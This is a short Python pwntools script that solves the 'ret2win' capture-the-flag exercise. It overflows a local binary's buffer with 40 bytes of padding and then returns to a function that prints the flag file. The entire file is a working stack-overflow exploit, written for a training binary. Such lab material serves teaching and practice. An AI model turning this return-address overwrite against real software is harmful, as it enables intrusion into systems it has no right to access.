from pwn import *

context(os='linux',arch='amd64')

def main():
  b = ELF('ret2win')
  r = ROP(b)

  # for this challenge, there's a function 'ret2win' which calls system("/bin/cat flag.txt")
  # under normal circumstances, this function is never called. to solve this challenge, we just
  # need to return to the address of the 'ret2win' function.
  p = process('./ret2win')
  r.call(b.symbols['ret2win'])

  p.recvuntil("> ")
  log.info("Sending exploit")
  p.sendline("A" * 40 + str(r))
  print(p.recvall())

if __name__ == "__main__":
    main()